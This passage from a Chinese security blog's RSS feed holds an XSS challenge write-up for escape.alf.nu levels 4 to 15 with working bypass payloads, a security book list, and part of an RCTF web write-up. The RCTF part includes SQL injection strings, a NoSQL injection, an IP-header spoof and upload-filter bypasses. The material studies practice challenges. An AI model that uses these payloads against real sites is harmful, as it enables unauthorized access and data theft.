+&lt;p&gt;这题对’&amp;lt;’和’”’做了过滤，但是其中双引号只过滤了一个。又因为$2中只能放置字母，所以考虑将用来闭合的双引号放在$1中。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+[[s|&quot;&quot;onload=&quot;alert(1)]]
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/5&quot;&gt;第5题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Level 4 had a typo, thanks Alok.
+  // If your solution for 4 still works here, you can go back and get more points on level 4 now.
+
+  var text = s.replace(/&amp;lt;/g, &#39;&amp;amp;lt;&#39;).replace(/&quot;/g, &#39;&amp;amp;quot;&#39;);
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, &#39;&amp;lt;a href=&quot;$1&quot;&amp;gt;$1&amp;lt;/a&amp;gt;&#39;);
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &#39;&amp;lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&amp;gt;&#39;);
+  return text;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这里明显弥补了上一题的漏洞，所以不能再直接使用双引号闭合。于是可以借用第二个替换中的双引号去闭合。为了使a标签里的前后两个双引号被闭合img里的双引号闭合掉，需要在onload=alert(1)后用双斜线注释符。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+[[a|http://onload=alert(1)//]]
+&lt;/code&gt;&lt;br /&gt;
+可以看到在chrome中被最后解析为&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&amp;lt;img alt=&quot;&amp;lt;a href=&quot; http:=&quot;&quot; onload=&quot;alert(1)//&amp;amp;quot;&quot; src=&quot;a.gif&quot;&amp;gt;
+&quot;&amp;amp;gt;http://onload=alert(1)//]]
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/6&quot;&gt;第6题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Slightly too lazy to make two input fields.
+  // Pass in something like &quot;TextNode#foo&quot;
+  var m = s.split(/#/);
+
+  // Only slightly contrived at this point.
+  var a = document.createElement(&#39;div&#39;);
+  a.appendChild(document[&#39;create&#39;+m[0]].apply(document, m.slice(1)));
+  return a.innerHTML;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;可以看到这题是以’#’为分隔符，前面部分与create拼接作为方法，后面部分则作为该方法的一个参数。差了些资料后发现这里使用的是createComment方法，即创建注释标签。后半部分闭合掉注释标签后就可以任意施为了。选一个字符相对较少的&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+Comment#&amp;gt;&amp;lt;svg/onload=alert(1)
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a herf=&quot;http://escape.alf.nu/7/&quot;&gt;第7题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Pass inn &quot;callback#userdata&quot;
+  var thing = s.split(/#/);
+
+  if (!/^[a-zA-Z\[\]&#39;]*$/.test(thing[0])) return &#39;Invalid callback&#39;;
+  var obj = {&#39;userdata&#39;: thing[1] };
+  var json = JSON.stringify(obj).replace(/&amp;lt;/g, &#39;\\u003c&#39;);
+  return &quot;&amp;lt;script&amp;gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&amp;lt;/script&amp;gt;&quot;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这题跟之前的类似，也是以’#’为分隔符。虽然过滤了双引号但是依然可以使用单引号。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&#39;#&#39;;alert(1)//
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/8&quot;&gt;第8题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Courtesy of Skandiabanken
+  return &#39;&amp;lt;script&amp;gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&amp;lt;/script&amp;gt;&#39;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这题将所有的字母替换成了大写形式，因此有两种思路，一是闭合script标签然后引用外部js，而是用&lt;a href=&quot;http://www.jsfuck.com/&quot;&gt;JSFUCK&lt;/a&gt;。&lt;br /&gt;
+JSFUCK的原理是用类似&lt;code class=&quot;highlighter-rouge&quot;&gt;[][&#39;sort&#39;][&#39;constructor&#39;](alert(1))&lt;/code&gt;的方式，通过构造字符串来执行相应的函数。而构造字符串需要的字母则通过将布尔值转为字符串后取字母的方式获取，例如字母’a’就可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;(![]+[])[1]&lt;/code&gt;来获取,字母’b’则可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;(&#39;&#39;+{})[2]&lt;/code&gt;来获取。&lt;br /&gt;
+参考资料：&lt;a href=&quot;http://www.freebuf.com/articles/web/81688.html#rd&quot;&gt;http://www.freebuf.com/articles/web/81688.html#rd&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/9/&quot;&gt;第9题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // This is sort of a spoiler for the last level :-)
+
+  if (/[\\&amp;lt;&amp;gt;]/.test(s)) return &#39;-&#39;;
+
+  return &#39;&amp;lt;script&amp;gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&amp;lt;/script&amp;gt;&#39;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这题过滤的’&amp;lt;’,’&amp;gt;’所以不能引用外部JS。采用上一题的第二种方式即可。&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/10/&quot;&gt;第10题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  function htmlEscape(s) {
+    return s.replace(/./g, function(x) {
+       return { &#39;&amp;lt;&#39;: &#39;&amp;amp;lt;&#39;, &#39;&amp;gt;&#39;: &#39;&amp;amp;gt;&#39;, &#39;&amp;amp;&#39;: &#39;&amp;amp;amp;&#39;, &#39;&quot;&#39;: &#39;&amp;amp;quot;&#39;, &quot;&#39;&quot;: &#39;&amp;amp;#39;&#39; }[x] || x;       
+     });
+  }
+
+  function expandTemplate(template, args) {
+    return template.replace(
+        /{(\w+)}/g,
+        function(_, n) {
+           return htmlEscape(args[n]);
+         });
+  }
+
+  return expandTemplate(
+    &quot;                                                \n\
+      &amp;lt;h2&amp;gt;Hello, &amp;lt;span id=name&amp;gt;&amp;lt;/span&amp;gt;!&amp;lt;/h2&amp;gt;         \n\
+      &amp;lt;script&amp;gt;                                       \n\
+         var v = document.getElementById(&#39;name&#39;);    \n\
+         v.innerHTML = &#39;&amp;lt;a href=#&amp;gt;{name}&amp;lt;/a&amp;gt;&#39;;       \n\
+      &amp;lt;\/script&amp;gt;                                     \n\
+    &quot;,
+    { name : s }
+  );
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;可以看到对很多XSS常用符号做了过滤，但是没有过滤反斜线。但是由于是先写入script再解析，所以可以使用JS支持的编码方式绕过。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+\74svg/onload=alert(1)\76
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a herf=&quot;http://escape.alf.nu/11&quot;&gt;第11题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Spoiler for level 2
+  s = JSON.stringify(s).replace(/&amp;lt;\/script/gi, &#39;&#39;);
+
+  return &#39;&amp;lt;script&amp;gt;console.log(&#39; + s + &#39;);&amp;lt;/script&amp;gt;&#39;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这里JSON化了字符串之外还过滤的’&amp;lt;/script&amp;gt;‘，只不过不是替换为别的字符串而是简单的替换为空，所以利用类似&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;/&amp;lt;/scriptscript&amp;gt;&lt;/code&gt;的方式就可以绕过。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&amp;lt;/&amp;lt;/scriptscript&amp;gt;&amp;lt;script&amp;gt;alert(1)//
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/12&quot;&gt;第12题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  // Pass inn &quot;callback#userdata&quot;
+  var thing = s.split(/#/);
+
+  if (!/^[a-zA-Z\[\]&#39;]*$/.test(thing[0])) return &#39;Invalid callback&#39;;
+  var obj = {&#39;userdata&#39;: thing[1] };
+  var json = JSON.stringify(obj).replace(/\//g, &#39;\\/&#39;);
+  return &quot;&amp;lt;script&amp;gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&amp;lt;/script&amp;gt;&quot;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这题跟前面的一题类似，只不过多了对’/’的过滤，所以不能使用’//’注释符。但是javascript支持html的注释符&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!--&lt;/code&gt;,因此可以绕过过滤。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&#39;#&#39;;alert(1)&amp;lt;!--
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/13&quot;&gt;第13题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  var tag = document.createElement(&#39;iframe&#39;);
+
+  // For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.
+  //
+  // http://print.alf.nu/?html=... just outputs whatever you pass in.
+  //
+  // Alerting from print.alf.nu won&#39;t count; try to trigger the one below.
+
+  s = &#39;&amp;lt;script&amp;gt;&#39; + s + &#39;&amp;lt;\/script&amp;gt;&#39;;
+  tag.src = &#39;http://print.alf.nu/?html=&#39; + encodeURIComponent(s);
+
+  window.WINNING = function() { youWon = true; };
+
+  tag.onload = function() {
+    if (youWon) alert(1);
+  };
+  document.body.appendChild(tag);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这个题想了好久都没整明白，最后还是看了别人的题解T_T。看题目可以知道加载了不同域的一个页面，而这个页面下存在反射型XSS。题目的要求是在子域下让父域里的变量youWon存在。&lt;br /&gt;
+window对象中可以这样访问一个子窗口:&lt;code class=&quot;highlighter-rouge&quot;&gt;window.frames[&#39;窗口名&#39;]&lt;/code&gt;，并且由于window对象是全局对象，所以省略window也可以访问：&lt;code class=&quot;highlighter-rouge&quot;&gt;frames[&#39;窗口名&#39;]&lt;/code&gt;。 而其实还可以使用数组索引的方法访问一个子窗口: &lt;code class=&quot;highlighter-rouge&quot;&gt;window[&#39;窗口名&#39;]&lt;/code&gt;这种写法还可以表示为:&lt;code class=&quot;highlighter-rouge&quot;&gt;window.窗口名&lt;/code&gt; 因此在子域名里设置name=’youWon’;其实就是将子窗口名设置为youWon，这样导致父窗口下可以这样访问了window.youWon。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+name=&#39;youWon&#39;;
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/14&quot;&gt;第14题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  function json(s) { return JSON.stringify(s).replace(/\//g, &#39;\\/&#39;); }
+  function html(s) { return s.replace(/[&amp;lt;&amp;gt;&quot;&amp;amp;]/g, function(s) {
+                        return &#39;&amp;amp;#&#39; + s.charCodeAt(0) + &#39;;&#39;; }); }
+
+  return (
+    &#39;&amp;lt;script&amp;gt;&#39; +
+      &#39;var url = &#39; + json(s) + &#39;; // We\&#39;ll use this later &#39; +
+    &#39;&amp;lt;/script&amp;gt;\n\n&#39; +
+    &#39;  &amp;lt;!-- for debugging --&amp;gt;\n&#39; +
+    &#39;  URL: &#39; + html(s) + &#39;\n\n&#39; +
+    &#39;&amp;lt;!-- then suddenly --&amp;gt;\n&#39; +
+    &#39;&amp;lt;script&amp;gt;\n&#39; +
+    &#39;  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#39; +
+    &#39;  else new Image().src = url;\n&#39; +
+    &#39;&amp;lt;/script&amp;gt;&#39;
+  );
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这个题参考了&lt;a href=&quot;https://communities.coverity.com/blogs/security/2012/11/16/did-i-do-that-html-5-js-escapers-3&quot;&gt;这篇文章&lt;/a&gt;。当&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!--&lt;/code&gt;注释符遇到&lt;script&gt;标签时会开始找&lt;/script&gt;标签，然后注释掉这两个标签。如果填写的字符串类似&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!--&amp;lt;script&amp;gt;&lt;/code&gt;时，最近的的&amp;lt;/script&amp;gt;标签就会被注释掉。此时’URL:xxx’的内容变成了JS代码，而下面的if语句中有&lt;code class=&quot;highlighter-rouge&quot;&gt;*/&lt;/code&gt;，因此只要在前面填入&lt;code class=&quot;highlighter-rouge&quot;&gt;/*&lt;/code&gt;符号匹配即可注释掉中间的多余代码。然后用&lt;code class=&quot;highlighter-rouge&quot;&gt;if(alert(1)&lt;/code&gt;与后面拼接可得&lt;code class=&quot;highlighter-rouge&quot;&gt;if(alert(1).test(url))&lt;/code&gt;，从而执行alert(1)。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+if(alert(1)/*&amp;lt;!--&amp;lt;script&amp;gt;
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://escape.alf.nu/15&quot;&gt;第15题&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function escape(s) {
+  return s.split(&#39;#&#39;).map(function(v) {
+      // Only 20% of slashes are end tags; save 1.2% of total
+      // bytes by only escaping those.
+      var json = JSON.stringify(v).replace(/&amp;lt;\//g, &#39;&amp;lt;\\/&#39;);
+      return &#39;&amp;lt;script&amp;gt;console.log(&#39;+json+&#39;)&amp;lt;/script&amp;gt;&#39;;
+      }).join(&#39;&#39;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这个题依然用’#’为分隔符，将前后两部分分别填入两段JS中。由于过滤了’&amp;lt;/script’，所以不能直接加标签来XSS。用上一题&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!--&amp;lt;script&amp;gt;&lt;/code&gt;的方式使中间两个script标签失效。然后用’/’来与&amp;lt;/script&amp;gt;中的’/’形成正则，同时用’)’来闭合正则中的’(‘。&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&amp;lt;!--&amp;lt;script&amp;gt;#--&amp;gt;)/;alert(1)//
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;后记&lt;/h2&gt;
+&lt;p&gt;本来以为15题就是结束了，结果后面还有16题。然后发现总共有101道题，感觉是有生之年系列了，不能知道能不能搞完。本来以为做了一遍写这篇文章应该是很快的，没想到还是弄了一下午，很多东西做一遍根本没印象，是不是该吃点啥补补脑子了T_T。要期末了，求各路神仙保佑别挂科啊，想到我邮这学期这么多跳楼的，老师们会不会心慈手软一点呢。。。&lt;/p&gt;
+</description>
+        <pubDate>Sun, 20 Dec 2015 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2015/12/20/alert-part1/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2015/12/20/alert-part1/</guid>
+        
+        <category>web</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>安全·书单</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“慢慢看。”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;web&quot;&gt;WEB安全&lt;/h2&gt;
+
+&lt;p&gt;《http权威指南》&lt;br /&gt;
+《javascript权威指南》&lt;br /&gt;
+《xss跨站攻击与防御》&lt;br /&gt;
+《web前端黑客技术揭秘》&lt;br /&gt;
+《白帽子讲web安全》&lt;br /&gt;
+《metasploit渗透测试指南》&lt;br /&gt;
+《代码审计：企业级web安全代码架构》配《细说php》&lt;br /&gt;
+《kali linux &amp;amp; back track 渗透测试实践》&lt;br /&gt;
+《sql注入攻击与防御》&lt;br /&gt;
+《网络扫描技术揭秘》&lt;br /&gt;
+《python黑帽子》&lt;br /&gt;
+《黑客技术攻防宝典：web安全篇》&lt;br /&gt;
+《高度安全环境下的渗透测试》&lt;/p&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;移动安全&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;Android&lt;/em&gt;&lt;br /&gt;
+《Android软件安全与逆向分析》&lt;br /&gt;
+《Android安全攻防指南》&lt;br /&gt;
+《Android安全攻防实战》&lt;br /&gt;
+《Android安全技术揭秘与防范》&lt;br /&gt;
+《Android系统安全与反编译实战》&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;IOS&lt;/em&gt;&lt;br /&gt;
+《ios应用安全攻防实战》&lt;br /&gt;
+《黑客攻防技术宝典：ios实战篇》&lt;br /&gt;
+《ios取证实践》&lt;br /&gt;
+《ios应用逆向工程》&lt;br /&gt;
+《移动应用安全》&lt;br /&gt;
+《移动终端安全关键技术与分析》&lt;/p&gt;
+
+&lt;h2 id=&quot;bin&quot;&gt;BIN与逆向&lt;/h2&gt;
+
+&lt;p&gt;《加密与解密》&lt;br /&gt;
+《恶意代码分析实战》&lt;br /&gt;
+《挖0day》&lt;br /&gt;
+《有趣的二进制》&lt;br /&gt;
+《模糊测试：强制发掘安全漏洞的利器》&lt;br /&gt;
+《汇编语言》《格蠹汇编》&lt;br /&gt;
+《逆向工程实践》&lt;/p&gt;
+
+&lt;h2 id=&quot;linux&quot;&gt;LINUX类&lt;/h2&gt;
+
+&lt;p&gt;《linux内核源码剖析》上下&lt;br /&gt;
+《linux鸟哥的私房菜》&lt;br /&gt;
+《linux内核安全注释》&lt;br /&gt;
+《arm linux内核源码剖析》&lt;br /&gt;
+《tcp/ip详解》&lt;br /&gt;
+《linux内核设计与实现》&lt;/p&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;工具书&lt;/h2&gt;
+
+&lt;p&gt;《wireshark数据包分析实战》&lt;br /&gt;
+《metasploit渗透测试指南》&lt;br /&gt;
+《ida pro权威指南》&lt;br /&gt;
+《kali linux渗透测试的艺术》&lt;br /&gt;
+《github入门与实践》&lt;br /&gt;
+《fiddle调试权威指南》&lt;br /&gt;
+《计算机安全超级工具集》&lt;br /&gt;
+《雷神的微软平台宝典》&lt;/p&gt;
+
+&lt;h2 id=&quot;it&quot;&gt;IT思维&lt;/h2&gt;
+
+&lt;p&gt;《我的互联网方法论》&lt;br /&gt;
+《增长黑客》&lt;br /&gt;
+《德鲁克全书》&lt;br /&gt;
+《谷歌是如何运营的》&lt;br /&gt;
+《乔布斯传》&lt;br /&gt;
+《腾讯传》&lt;br /&gt;
+《互联网+小米案例版》&lt;br /&gt;
+《京东技术解密》&lt;/p&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;合集&lt;/h2&gt;
+
+&lt;p&gt;《互联网安全的40个智慧洞见》&lt;br /&gt;
+《黑客大曝光7》&lt;br /&gt;
+《代码大全》&lt;br /&gt;
+《深入理解计算机原理》&lt;/p&gt;
+
+&lt;h2 id=&quot;section-3&quot;&gt;其他&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;无线&lt;/em&gt;&lt;br /&gt;
+《无线网络攻防》&lt;br /&gt;
+《揭秘家用路由0day漏洞挖掘技术》&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;内核&lt;/em&gt;&lt;br /&gt;
+《内核漏洞的利用与防范》&lt;br /&gt;
+《windows内核安全与驱动开发》&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;浏览器&lt;/em&gt;&lt;br /&gt;
+《web之困》&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;数据安全&lt;/em&gt;&lt;br /&gt;
+《数据驱动安全》&lt;/p&gt;
+</description>
+        <pubDate>Mon, 30 Nov 2015 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2015/11/30/BookList/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2015/11/30/BookList/</guid>
+        
+        <category>杂谈</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>RCTF</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“here we go.”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;这次RCTF只搞了web题，其他题完全没时间去碰啊。。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-1&quot;&gt;web 1&lt;/h2&gt;
+
+&lt;p&gt;注册登陆进去后发现有上传，随后试验各种后缀名发现只有.jpg可以，顺便一提每次上传要过验证码真是蛋疼。&lt;br /&gt;
+随便上传个文件后发现会返回文件名和uid(这个uid一开始没发现作用，后来看了tomato大牛的题解才明白是啥用，后面再说)&lt;br /&gt;
+，随后会在上传的页面回显文件名。于是就在这里猜测是文件名有注入。在文件名后面加单引号成功上传，再次回到上传页面发现无任何文件名回显，因此猜测是二次注入。&lt;br /&gt;
+随后开始注入，先来一发aaaaaa’+version()+’.jpg，发现返回文件名为5.1。&lt;br /&gt;
+&lt;img src=&quot;/img/post/rctf-web1-1.png&quot; alt=&quot;img&quot; /&gt;&lt;br /&gt;
+继续，测试select和from发现被过滤了，分别改成selselectect和frfromom可绕过，后来又发现所有的字母都不会显示，于是只能一位一位猜表名、列名和字段。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload：&#39;+(selselectect if((selselectect count(*) frfromom information_schema.tables)&amp;gt;0,2,3))+&#39;
+&#39;+(selselectect if (1&amp;lt;2,ascii(mid((selselectect table_name frfromom information_schema.tables limit 29,1),1,1)),2))+&#39;
+&#39;+(selselectect if (1&amp;lt;2,ascii(mid((selselectect I_am_flag frfromom hello_flag_is_here limit 0,1),1,1)),2))+&#39;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;最后得到flag，!!_@m_Th.e_F!lag。&lt;/p&gt;
+
+&lt;p&gt;后来看tomato的题解发现，这题在insert的时候格式是(‘文件名’,’uid’,’uid’)，拖了一晚上验证码的我看到这真是哭了，&lt;br /&gt;
+因为做的时候也想过用这种方式注入，但是死活没成功，还是太菜了啊。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-2&quot;&gt;web 2&lt;/h2&gt;
+
+&lt;p&gt;注册的时候发现过滤了空格，注册一个账号aaaaa’“，然后进去发现一堆赵日天，叶良辰神马的然并卵的东西，最后在改密码的时候发现了报错。&lt;br /&gt;
+&lt;img src=&quot;/img/post/rctf-web2-1.png&quot; alt=&quot;img&quot; /&gt;&lt;br /&gt;
+明显的二次注入，用updatexml报错注入，先猜flag表，&lt;br /&gt;
+“&amp;amp;&amp;amp;updatexml(0x7e,concat(0x7e,(select(flag)from(flag))),0)#，&lt;br /&gt;
+告诉我flag is not here，真是哔了狗了。没办法，只有从表名开始猜了，因为报错注入只会返回一行，但是过滤了空格所以不能使用limit，&lt;br /&gt;
+在这我又get了一个新的姿势，那就是用mysql的regexp正则匹配函数。直接regexp(‘flag’)找到表名，读取内容是只返回前几个字符，没办法，再次用regexp(‘RCTF’)成功读到flag。&lt;br /&gt;
+RCTF{sql_1njecti0n_is_f4n_6666}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-3&quot;&gt;web 3&lt;/h2&gt;
+
+&lt;p&gt;注册一个账号，改密码的时候抓包发现可以修改要改密码的用户名，改成admin后登陆进去提示not allow ip，把XFF改成127.0.0.1后成功登陆。&lt;br /&gt;
+进去发现叫我们猜action，果断猜upload出现一个上传页面，发现没有验证码真是感动哭了。随后fuzz出可用的后缀名php4,php5。&lt;br /&gt;
+但是仍然提示不是真正的php，根据php的这几种格式，&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+&amp;lt;?php?&amp;gt;
+&amp;lt;??&amp;gt;
+&amp;lt;script language=&quot;php&quot;&amp;gt;&amp;lt;/script&amp;gt;
+asp的&amp;lt;%%&amp;gt;
+&lt;/code&gt;&lt;br /&gt;
+挨个尝试，发现script标签可以于是成功拿到flag。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-4&quot;&gt;web 4&lt;/h2&gt;
+
+&lt;p&gt;一开始没什么头绪，后来放出提示是nosql就猜测是mongodb，使用[$ne]和[$regex]跑出账号密码，ROIS_ADMIN pas5woRd_i5_45e2884c4e5b9df49c747e1d。&lt;br /&gt;
+登陆进去后，看源码发现上传需要先过useragent和cookie的验证。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$Agent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
+$backDoor = $_COOKIE[&#39;backdoor&#39;];
+$msg = json_encode(&quot;no privilege&quot;);
+$iterations = 1000;
+$salt = &quot;roisctf&quot;;
+$alg = &quot;sha1&quot;;
+$keylen = &quot;20&quot;;
+if ($Agent == $backDoor || strlen($Agent) != 65) {
+    exit($msg);
+}
+if (substr($Agent,0,23) != &quot;rois_special_user_agent&quot;) {
+    exit($msg);
+}
+if (pbkdf2($alg, $Agent, $salt, $iterations, $keylen) != pbkdf2($alg, $backDoor, $salt, $iterations, $keylen)) {
+    exit($msg);
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;搜了一发php下的pbkdf2函数发现了一个hash_pbkdf2函数，也没多想就当作是一回事了，因为php的==是弱比较，所以想着只要找俩字符串加密后与0e1相等就行了。&lt;br /&gt;
+于是就开始跑，跑出来后发现上传依然过不了，在这卡了好久。最后无奈去找客服搅基，客服说这个函数不是php的函数，他只是用php表示出来而已，囧。&lt;br /&gt;
+最后搜到这篇&lt;a href=&quot;https://mathiasbynens.be/notes/pbkdf2-hmac&quot;&gt;文章&lt;/a&gt;，用里面提供的脚本跑出一对字符串，rois_special_user_agentaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaamipvkd&lt;br /&gt;
+3-Rfm^Bq%3BZZAcl]mS&amp;amp;eE。&lt;br /&gt;
+测试能成功上传了。然后下载提供的备份文件，打开发现是一个关于zip解压的php文件。找官网下了原生版本后diff了一下发现了一处不同点。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+if ($p_header[&#39;filename_len&#39;] != 0)  {
+      $p_header[&#39;filename&#39;] = fread($this-&amp;gt;zip_fd, $p_header[&#39;filename_len&#39;]);
+      $preNum = substr_count($p_header[&#39;filename&#39;], &#39;../&#39;);
+      $prefix = str_repeat(&#39;../&#39;, $preNum);
+      $element = explode(&#39;.&#39;, str_replace($prefix, &#39;&#39;, $p_header[&#39;filename&#39;]));
+      $fname = $prefix . md5($element[0]. &#39;RoisFighting&#39;). &#39;.&#39; .end($element);
+      $p_header[&#39;filename&#39;] = $fname;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;知道这是解压后对文件进行了重命名，于是尝试计算出文件名后拼接到给出的上传路径去访问发现是404。&lt;br /&gt;
